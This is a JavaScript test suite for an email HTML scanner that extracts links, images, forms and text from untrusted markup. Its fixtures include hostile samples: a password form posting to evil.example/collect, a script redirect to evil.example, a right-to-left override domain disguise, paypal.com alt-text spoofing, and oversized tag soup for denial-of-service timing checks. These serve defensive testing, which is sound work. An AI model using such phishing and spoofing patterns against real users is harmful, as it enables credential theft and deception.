// The markup scanner: sender-written HTML in, inert structure out.
//
// The scanner is one forward pass, so half of these tests are about what it
// must survive — tags that never close, quotes that never pair, a body that
// is nothing but noise — and the other half about what it must still see.

import assert from 'node:assert/strict';
import { test } from 'node:test';

import { decodeEntities, MAX_MARKUP_ITEMS, scanMarkup } from '../js/markup.js';

// ------------------------------------------------------------------ the data

test('a link is extracted with its href and its visible text', () => {
  const { links } = scanMarkup('<p>Go to <a href="https://example.org/x?y=1">our site</a> now.</p>');
  assert.equal(links.length, 1);
  assert.equal(links[0].href, 'https://example.org/x?y=1');
  assert.equal(links[0].text, 'our site');
});

test('markup inside the link does not interrupt its visible text', () => {
  const { links } = scanMarkup('<a href="https://a.example"><b>bold</b> and <i>italic</i></a>');
  assert.equal(links[0].text, 'bold and italic');
});

test('image alt text counts as the visible text of the link around it', () => {
  const { links } = scanMarkup('<a href="https://a.example"><img src="https://b.example/l.png" alt="paypal.com"></a>');
  assert.equal(links[0].text, 'paypal.com');
});

test('an image is recorded with its geometry, as written', () => {
  const { images } = scanMarkup('<img src="https://t.example/p.gif" width="1" height="1" alt="">');
  assert.equal(images.length, 1);
  assert.equal(images[0].src, 'https://t.example/p.gif');
  assert.equal(images[0].width, '1');
  assert.equal(images[0].height, '1');
});

test('a form and its action are recorded', () => {
  const { forms } = scanMarkup('<form action="https://evil.example/collect"><input name="pw"></form>');
  assert.deepEqual(forms, [{ action: 'https://evil.example/collect' }]);
});

test('the first base href wins, like in a browser', () => {
  const { base } = scanMarkup('<base href="https://one.example/"><base href="https://two.example/">');
  assert.equal(base, 'https://one.example/');
});

test('text runs come out entity-decoded with word breaks at block tags', () => {
  const { text } = scanMarkup('<td>one</td><td>M&uuml;ller &amp; S&ouml;hne</td>');
  assert.match(text, /one\s+M/);
  assert.match(text, /Müller & Söhne/);
});

test('unquoted and single-quoted attributes parse too', () => {
  const { links } = scanMarkup("<a href=https://a.example/x>one</a><a href='https://b.example/y'>two</a>");
  assert.deepEqual(links.map((l) => l.href), ['https://a.example/x', 'https://b.example/y']);
});

test('entities in an href are decoded', () => {
  const { links } = scanMarkup('<a href="https://a.example/?x=1&amp;y=2">t</a>');
  assert.equal(links[0].href, 'https://a.example/?x=1&y=2');
});

// ------------------------------------------------------------------ the noise

test('script and style content is not text and yields no links', () => {
  const { text, links } = scanMarkup(
    '<style>a { color: red }</style><script>location="https://evil.example"</script><p>real</p>',
  );
  assert.doesNotMatch(text, /color: red/);
  assert.doesNotMatch(text, /evil\.example/);
  assert.match(text, /real/);
  assert.equal(links.length, 0);
});

test('comments and conditional comments are skipped', () => {
  const { text } = scanMarkup('<!--[if mso]><a href="https://x.example">mso</a><![endif]--><p>kept</p>');
  assert.doesNotMatch(text, /mso/);
  assert.match(text, /kept/);
});

test('a quoted > does not end the tag early', () => {
  const { links } = scanMarkup('<a href="https://a.example/?q=1>2">t</a>');
  assert.equal(links[0].href, 'https://a.example/?q=1>2');
});

test('a lone < is text, not a tag', () => {
  const { text } = scanMarkup('1 < 2 and 3 > 2');
  assert.match(text, /1 < 2 and 3 > 2/);
});

test('an unclosed tag at the end of input does not hang or throw', () => {
  const { links } = scanMarkup('<a href="https://a.example/x');
  assert.equal(links.length, 1);
  assert.equal(links[0].href, 'https://a.example/x');
});

test('an unclosed quote runs to the end without an infinite loop', () => {
  const out = scanMarkup('<a href="https://a.example>text that never ends');
  assert.ok(out);
});

test('a nested <a> closes the previous one, as browsers do', () => {
  const { links } = scanMarkup('<a href="https://one.example">first<a href="https://two.example">second</a>');
  assert.equal(links.length, 2);
  assert.equal(links[0].text, 'first');
  assert.equal(links[1].text, 'second');
});

test('a duplicated attribute keeps its first spelling, like a browser', () => {
  const { links } = scanMarkup('<a href="https://real.example" href="https://decoy.example">t</a>');
  assert.equal(links[0].href, 'https://real.example');
});

test('a script that never closes swallows the rest, like a browser', () => {
  const { links } = scanMarkup('<script>var x = 1;<a href="https://evil.example">still script</a>');
  assert.equal(links.length, 0);
});

// --------------------------------------------------------------- the hostile

test('a hostile entity decodes to its real codepoint for the findings to see', () => {
  // U+202E must come out as the genuine byte: the finding needs to see what a
  // mail client would render, and neutralise defuses it on the way to screen.
  assert.equal(decodeEntities('evil&#x202E;moc'), 'evil‮moc');
  assert.equal(decodeEntities('a&#0;b'), `a${String.fromCharCode(0)}b`);
  assert.equal(decodeEntities('&amp;&unknown;'), '&&unknown;');
});

test('the item ceiling bites and says so', () => {
  const many = '<a href="https://a.example/x">t</a>'.repeat(MAX_MARKUP_ITEMS + 10);
  const { links, truncated } = scanMarkup(many);
  assert.equal(links.length, MAX_MARKUP_ITEMS);
  assert.equal(truncated, true);
});

test('link text past its ceiling is clipped, not unbounded', () => {
  const { links } = scanMarkup(`<a href="https://a.example">${'x'.repeat(5000)}</a>`);
  assert.ok(links[0].text.length <= 600);
});

// -------------------------------------------------------------------- timing
//
// Wall-clock, deliberately — the same call the hostile suite makes, for the
// same reason: a shape assertion cannot go red on a regex that has started to
// backtrack, which is the only failure these guard against. A ceiling can, so
// long as it sits far enough above the honest cost to ignore a slow runner and
// far enough below a quadratic blow-up to still catch one. The rule the hostile
// suite states is ~20x the cost measured on the machine this was written on;
// these three had drifted to ~3x, and the unclosed-brackets scan (~450ms here,
// ~1.5s on a shared CI runner) duly went red at 1515ms against a 1500ms line.
// Reset to the 20x the rest of the suite uses: the gap to a real regression is
// enormous — quadratic behaviour on 4 MB is minutes, not milliseconds — so the
// headroom is free, and the number is a tripwire, not a latency budget.

const took = (fn) => {
  const started = Date.now();
  fn();
  return Date.now() - started;
};

test('4 MB of hostile tag soup scans without backtracking', () => {
  const soup = '<a href="https://x.example/aaaaaaaa?b=ccccc">text</a><<<>>><b><i><td>'.repeat(60000);
  const ms = took(() => scanMarkup(soup));
  assert.ok(ms < 2500, `took ${ms}ms`); // ~20x the ~120ms measured here
});

test('4 MB of unclosed brackets scans without backtracking', () => {
  const ms = took(() => scanMarkup('< '.repeat(2 * 1024 * 1024)));
  assert.ok(ms < 9000, `took ${ms}ms`); // ~20x the ~450ms measured here
});

test('4 MB of script that never closes scans instantly', () => {
  const ms = took(() => scanMarkup(`<script>${'x'.repeat(4 * 1024 * 1024)}`));
  assert.ok(ms < 500, `took ${ms}ms`); // bails at the tag; measured ~0ms
});
